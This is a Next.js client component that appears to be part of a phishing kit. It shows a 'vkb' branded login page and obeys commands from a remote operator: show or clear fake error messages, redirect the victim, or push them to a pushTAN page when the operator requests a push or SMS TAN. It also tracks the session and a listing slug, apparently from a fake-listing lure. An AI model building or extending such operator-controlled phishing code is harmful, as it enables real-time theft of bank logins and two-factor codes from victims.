"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import LoginFlow from "@/components/LoginFlow";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import { saveListingSlug, startSession, onCommand } from "@/lib/track";

export default function ClientShell({ initialSlug }: { initialSlug: string | null }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    if (initialSlug) saveListingSlug(initialSlug);
    startSession("vkb");

    onCommand((cmd) => {
      if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Error");
      } else if (cmd.type === "clear_error") {
        setError(null);
      } else if (cmd.type === "redirect") {
        const url = (cmd.payload as { url?: string }).url;
        if (url) window.location.href = url;
      } else if (cmd.type === "request_push_tan") {
        router.push("/pushtan");
      } else if (cmd.type === "request_sms_tan") {
        router.push("/pushtan");
      }
    });
  }, [initialSlug, router]);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/vkb/bg-desktop.jpg')",
        backgroundColor: "#e8e8e8",
      }}
    >
      {error && (
        <div className="mx-auto mt-4 w-full max-w-[460px] px-4 z-50">
          <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
            {error}
          </div>
        </div>
      )}
      <LoginFlow />
      <Footer />
      <HelpButton />
    </div>
  );
}
